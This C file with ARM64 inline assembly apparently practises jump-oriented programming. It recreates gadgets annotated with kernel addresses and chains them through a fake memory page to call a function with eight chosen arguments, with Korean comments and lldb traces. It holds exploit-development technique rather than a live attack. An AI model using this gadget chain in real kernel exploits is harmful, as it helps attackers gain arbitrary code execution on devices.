#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

void *my_page = NULL;

uint64_t func_arg8(uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7, uint64_t a8) {

    printf("a1 = 0x%llx, a2 = 0x%llx, a3 = 0x%llx, a4 = 0x%llx, a5 = 0x%llx, a6 = 0x%llx, a7 = 0x%llx, a8 = 0x%llx\n", \
        a1, a2, a3, a4, a5, a6, a7, a8);

    return 0xCAFEBABE41424344;
}

//FFFFFFF0085DEE04
__attribute__((naked)) uint64_t gadget_populate(uint64_t *x0) {
    __asm__ volatile (
        "ldp x4, x0, [x1] \n"
        "ldp x8, x2, [x1, #0x10] \n" 
        "ldr x3, [x1, #0x20] \n" 
        "mov x1, x8 \n"
        "br x4 \n"
    );
}

//FFFFFFF008950124
__attribute__((naked)) uint64_t gadget_prologue(uint64_t *x0) {
    __asm__ volatile (
        "stp x20, x19, [sp, #-0x20]!\n" 
        "stp x29, x30, [sp, #0x10]\n" 
        "add x29, sp, #0x10\n"        
        "mov x19, x1\n"                
        "ldr x0, [x0, #0x98]\n"          
        "ldr x8, [x0]\n"               
        "ldr x8, [x8, #0x7C0]\n"      
        "blr x8\n"                    
        "str x0, [x19]\n"             
        "mov w0, #0\n"               
        "ldp x29, x30, [sp, #0x10]\n"   
        "ldp x20, x19, [sp], #0x20\n"   
        "ret\n"
    );
}

//FFFFFFF0087BD4F4
__attribute__((naked)) void mov_x15_x2__br_x3(void) {
    __asm__ volatile (
        "mov x15, x2\n"
        "br x3\n"
    );
}

//FFFFFFF00874CF28
__attribute__((naked)) void mov_x9_x15__br_x16(void) {
    __asm__ volatile (
        "mov x9, x15\n"
        "br x16\n"
    );
}

//FFFFFFF008A01918
__attribute__((naked)) void mov_x1_x2__br_x3(void) {
    __asm__ volatile (
        "mov x1, x2\n"
        "br x3\n"
    );
}

//FFFFFFF008E43614
__attribute__((naked)) void mov_x4_x8__br_x10(void) {
    __asm__ volatile (
        "mov x4, x8\n"
        "br x10\n"
    );
}

//mov x16, x1 ; br x2
__attribute__((naked)) void mov_x16_x1__br_x2(void) {
    __asm__ volatile (
        "mov x16, x1\n"
        "br x2\n"
    );
}

//mov x2, x8 ; br x3
__attribute__((naked)) void mov_x2_x8__br_x3(void) {
    __asm__ volatile (
        "mov x2, x8\n"
        "br x3\n"
    );
}

//mov x16, x14 ; br x3
__attribute__((naked)) void mov_x16_x14__br_x3(void) {
    __asm__ volatile (
        "mov x16, x14\n"
        "br x3\n"
    );
}

//mov x14, x3 ; br x4
__attribute__((naked)) void mov_x14_x3__br_x4(void) {
    __asm__ volatile (
        "mov x14, x3\n"
        "br x4\n"
    );
}

//mov x16, x11 ; br x3
__attribute__((naked)) void mov_x16_x11__br_x3(void) {
    __asm__ volatile (
        "mov x16, x11\n"
        "br x3\n"
    );
}

//mov x14, x11 ; br x15
__attribute__((naked)) void mov_x14_x11__br_x15(void) {
    __asm__ volatile (
        "mov x14, x11\n"
        "br x15\n"
    );
}

//FFFFFFF0088191C0
//mov x10, x0 ; br x2
__attribute__((naked)) void mov_x10_x0__br_x2(void) {
    __asm__ volatile (
        "mov x10, x0\n"
        "br x2\n"
    );
}

//mov x14, x1 ; br x2
__attribute__((naked)) void mov_x14_x1__br_x2(void) {
    __asm__ volatile (
        "mov x14, x1\n"
        "br x2\n"
    );
}

//FFFFFFF00874C65C
//mov x12, x0 ; br x2
__attribute__((naked)) void mov_x12_x0__br_x2(void) {
    __asm__ volatile (
        "mov x12, x0\n"
        "br x2\n"
    );
}

//FFFFFFF0087E8564
//mov x16, x15 ; br x12
__attribute__((naked)) void mov_x16_x15__br_x12(void) {
    __asm__ volatile (
        "mov x16, x15\n"
        "br x12\n"
    );
}

//FFFFFFF008801D90
//mov x7, x16 ; br x10
__attribute__((naked)) void mov_x7_x16__br_x10(void) {
    __asm__ volatile (
        "mov x7, x16\n"
        "br x10\n"
    );
}

//FFFFFFF00877A80C
//mov x10, x0 ; br x12
__attribute__((naked)) void mov_x10_x0__br_x12(void) {
    __asm__ volatile (
        "mov x10, x0\n"
        "br x12\n"
    );
}

//mov x8, x10 ; br x12
__attribute__((naked)) void mov_x8_x10__br_x12(void) {
    __asm__ volatile (
        "mov x8, x10\n"
        "br x12\n"
    );
}

//mov x11, x10 ; br x12
__attribute__((naked)) void mov_x11_x10__br_x12(void) {
    __asm__ volatile (
        "mov x11, x10\n"
        "br x12\n"
    );
}


//mov x13, x14 ; br x12
__attribute__((naked)) void mov_x13_x14__br_x12(void) {
    __asm__ volatile (
        "mov x13, x14\n"
        "br x12\n"
    );
}

//FFFFFFF008754D50
//mov x13, x2 ; br x12
__attribute__((naked)) void mov_x13_x2__br_x12(void) {
    __asm__ volatile (
        "mov x13, x2\n"
        "br x12\n"
    );
}

//FFFFFFF00881B5CC
//mov x4, x13 ; br x15
__attribute__((naked)) void mov_x4_x13__br_x15(void) {
    __asm__ volatile (
        "mov x4, x13\n"
        "br x15\n"
    );
}

int writebuf(uint64_t addr, const void* input, size_t size) {
    memcpy((void*)addr, input, size); 
    return 0;
}

int write64(uint64_t a, uint64_t v) {
    return writebuf(a, &v, sizeof(v));
}

int write32(uint64_t a, uint32_t v) {
    return writebuf(a, &v, sizeof(v));
}

int readbuf(uint64_t addr, void* output, size_t size) {
    memcpy((void*)output, addr, size);

    return 0;
}

uint64_t read64(uint64_t a) {
    uint64_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

uint32_t read32(uint64_t a) {
    uint32_t value = 0;
    readbuf(a, &value, sizeof(value));
    return value;
}

void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", (long long unsigned int)&data, i);
        }

        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        }
        else
            ascii[i % 16] = '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0)
                printf("|  %s \n", ascii);
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");

                printf("|  %s \n", ascii);
            }
        }
    }
}


uint32_t my_call6(uint64_t addr, uint64_t a1, uint64_t a2, uint64_t a3, uint64_t a4, uint64_t a5, uint64_t a6, uint64_t a7) {
    uint32_t ret = 0;

    //TODO: call func_arg8 using addr
    uint64_t (*func)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t) = 
        (uint64_t (*)(uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t, uint64_t)) addr;

    ret = (uint32_t)func(a1, a2, a3, a4, a5, a6, a7, 0);

    return ret;
}

/*

mov x0, x12 ; br x10
mov x1, x21 ; br x10
mov x11, x19 ; br x10
mov x12, x14 ; br x10
mov x12, x9 ; br x10
mov x15, x0 ; br x10
mov x15, x16 ; br x10
mov x15, x3 ; br x10
mov x2, x1 ; br x10
mov x3, x8 ; br x10
mov x4, x3 ; br x10 
mov x4, x8 ; br x10 vv
mov x5, x15 ; br x10
mov x5, x8 ; br x10
mov x7, x16 ; br x10 v
mov x7, x8 ; br x10
mov x8, x11 ; br x10
mov x8, x9 ; br x10
mov x9, x11 ; br x10
mov x9, x4 ; br x10
mov x9, x8 ; br x10

mov x0, x11 ; br x12
mov x0, x15 ; br x12
mov x10, x0 ; br x12 vv mov_x10_x0__br_x12
mov x10, x11 ; br x12
mov x10, x13 ; br x12
mov x10, x19 ; br x12
mov x10, x9 ; br x12
mov x11, x10 ; br x12 vvv
mov x11, x14 ; br x12
mov x11, x9 ; br x12
mov x13, x14 ; br x12
mov x13, x2 ; br x12 vvvv
mov x14, x13 ; br x12
mov x14, x16 ; br x12 vvv
mov x15, x16 ; br x12
mov x16, x15 ; br x12 v
mov x3, x15 ; br x12
mov x5, x0 ; br x12
mov x8, x10 ; br x12 vv mov_x8_x10__br_x12
mov x9, x10 ; br x12 vvv
mov x9, x11 ; br x12
mov x9, x17 ; br x12
mov x9, x2 ; br x12

mov x0, x1 ; br x2 
mov x0, x8 ; br x2
mov x0, x9 ; br x2
mov x1, x14 ; br x2
mov x1, x16 ; br x2
mov x1, x8 ; br x2 
mov x10, x0 ; br x2 v
mov x12, x0 ; br x2 v
mov x14, x1 ; br x2 x
mov x16, x1 ; br x2 x
mov x17, x16 ; br x2

mov x0, x8 ; br x3
mov x1, x0 ; br x3
mov x1, x2 ; br x3
mov x1, x8 ; br x3
mov x1, x9 ; br x3
mov x15, x2 ; br x3 v
mov x16, x11 ; br x3
mov x16, x14 ; br x3
mov x2, x1 ; br x3
mov x2, x15 ; br x3 v
mov x2, x8 ; br x3

*/

//mov_x15_x2__br_x3 ok

//mov_x9_x15__br_x16 ok

//mov_x16_x2__br_x3 
//-> mov x0, x1 ; br x2
//-> mov x1, x2 ; br x3

//mov_x14_x2__br_x3

//mov_x1_x2__br_x3

//mov_x10_x14__br_x16 
//-> mov x11, x10 ; br x0, 
//mov x11, x13 ; br x0, 
//mov x11, x17 ; br x0, 
//mov x11, x8 ; br x0, 
//mov x13, x11 ; br x0,
//mov x13, x16 ; br x0
//mov x14, x17 ; br x0
//mov x15, x11 ; br x0
//mov x15, x14 ; br x0
//mov x15, x19 ; br x0
//mov x16, x17 ; br x0
//mov x19, x11 ; br x0
//mov x26, x27 ; br x0
//mov x27, x15 ; br x0

//mov_x7_x8__br_x10

//mov_x1_x9__br_x13

//mov_x13_x14__br_x16

//mov_x4_x8__br_x10

uint64_t call8_jop(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    write64(my_page, my_page);
    write64(my_page + 0x98, my_page);
    write64(my_page + 0x7c0, gadget_populate + 4);

    //gadget_populate + 4 함수에서 진입했을때, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 my_call6의 a5 참조 (a5 = mov_x15_x2__br_x3)
    write64(my_page + 0x100, 0);
    write64(my_page + 0x108, 0);
    write64(my_page + 0x110, my_page + 0x800);  //x1 = x8
    write64(my_page + 0x118, x7);               //x2
    write64(my_page + 0x120, gadget_populate);  //x3

    //mov_x15_x2__br_x3
    //이제 x15 = x2 (call8_jop's x7)
    //x3에 의해 gadget_populate으로 분기;

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x12_x0__br_x2으로 분기
    uint64_t current_page = my_page + 0x800;
    write64(current_page, mov_x12_x0__br_x2);   //x4
    write64(current_page + 0x8, gadget_populate);                    //x0
    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
    write64(current_page + 0x18, gadget_populate);      //x2
    write64(current_page + 0x20, 0);      //x3

    //mov_x12_x0__br_x2
    //x12에 gadget_populate 주소 백업 후 populate 복귀.

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x10_x0__br_x2으로 분기
    current_page += 0x40;
    write64(current_page, mov_x10_x0__br_x2);   //x4
    write64(current_page + 0x8, gadget_populate);           //x0
    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
    write64(current_page + 0x18, gadget_populate);      //x2
    write64(current_page + 0x20, 0);      //x3

    //mov_x10_x0__br_x2
    //x10에 gadget_populate 주소 백업 후 populate 복귀. 

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x16_x15__br_x12으로 분기
    current_page += 0x40; 
    write64(current_page, mov_x16_x15__br_x12);   //x4
    write64(current_page + 0x8, gadget_populate);           //x0
    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
    write64(current_page + 0x18, gadget_populate);      //x2
    write64(current_page + 0x20, 0);      //x3

    //mov_x16_x15__br_x12
    //x16 = x15 (jop's x7), populate 복귀.

    // (lldb) reg read
    // General Purpose Registers:
    //         x0 = 0x00000001000034b4  jop3`gadget_populate
    //         x1 = 0x000000015b00ab00
    //         x2 = 0x00000001000034b4  jop3`gadget_populate
    //         x3 = 0x0000000000000000
    //         x4 = 0x00000001000035ac  jop3`mov_x7_x16__br_x10
    //         x5 = 0xdeadbeef41424345
    //         x6 = 0xdeadbeef41424346
    //         x7 = 0xdeadbeef41424347
    //x7에 jop's x7 집어넣기 성공.

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x7_x16__br_x10으로 분기
    current_page += 0x40; 
    write64(current_page, mov_x7_x16__br_x10);   //x4
    write64(current_page + 0x8, gadget_populate);           //x0
    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
    write64(current_page + 0x18, gadget_populate);      //x2
    write64(current_page + 0x20, 0);      //x3

    //mov_x7_x16__br_x10
    //x7 = x16 (jop's x7), populate 복귀

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x10_x0__br_x12으로 분기
    current_page += 0x40; 
    write64(current_page, mov_x10_x0__br_x12);   //x4
    write64(current_page + 0x8, x4);           //x0
    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
    write64(current_page + 0x18, gadget_populate);      //x2
    write64(current_page + 0x20, 0);      //x3

    //mov_x10_x0__br_x12
    //x10 = x0 (jop's x4), populate 복귀

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x13_x2__br_x12으로 분기
    current_page += 0x40; 
    write64(current_page, mov_x13_x2__br_x12);   //x4
    write64(current_page + 0x8, gadget_populate);           //x0
    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
    write64(current_page + 0x18, x4);      //x2
    write64(current_page + 0x20, 0);      //x3

    //mov_x8_x10__br_x12 (실패)
    //x8 = x10 (jop's x4). populate 복귀.
    //이는 추후, mov_x4_x8__br_x10 을 통해 x10에서 addr 호출할 예정.
    //그러나, 마지막 write64(current_page + 0x10, x1);      //x1 = x8 에서 충돌함.

    //mov_x13_x2__br_x12
    //x13 = x2 (jop's x4), populate 복귀.

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    //이후에 br x4 문은 mov_x15_x2__br_x3으로 분기
    current_page += 0x40; 
    write64(current_page, mov_x15_x2__br_x3);   //x4
    write64(current_page + 0x8, gadget_populate);           //x0
    write64(current_page + 0x10, current_page + 0x40);      //x1 = x8
    write64(current_page + 0x18, addr);      //x2
    write64(current_page + 0x20, gadget_populate);      //x3
    
    //mov_x15_x2__br_x3
    //x15 = x2 (jop's addr), populate 복귀.

    //gadget_populate 함수 진입, 다음 레지스터 참조. (주석 참고) 
    current_page += 0x40; 
    write64(current_page, mov_x4_x13__br_x15);   //x4
    write64(current_page + 0x8, x0);           //x0
    write64(current_page + 0x10, x1);      //x1 = x8
    write64(current_page + 0x18, x2);      //x2
    write64(current_page + 0x20, x3);      //x3

    uint64_t STORED_RET = my_page + 0x100;
    uint64_t ret2 = my_call6(gadget_prologue, my_page, STORED_RET, 0, 0, mov_x15_x2__br_x3, x5, x6);

    // hexdump(my_page, 0x1000);

    uint64_t ret = read64(STORED_RET);

    return ret;
}


int main(int argc, char *argv[], char *envp[]) {
#if 0 
    printf("jop_practice\n");

    uint64_t ret = func_arg8(0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48);
    printf("func_arg8 ret = 0x%llx\n", ret);

    my_call6(func_arg8, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47);
#endif

    my_page = malloc(0x1000);
    memset(my_page, 0x0, 0x1000);
    printf("my_page = %p\n", my_page);


    uint64_t ret = call8_jop(func_arg8, 0xdeadbeef41424340, 0xdeadbeef41424341, 0xdeadbeef41424342, 0xdeadbeef41424343, 0xdeadbeef41424344, 0xdeadbeef41424345, 0xdeadbeef41424346, 0xdeadbeef41424347);
    printf("call8_jop ret = 0x%llx\n", ret);

    return 0;
}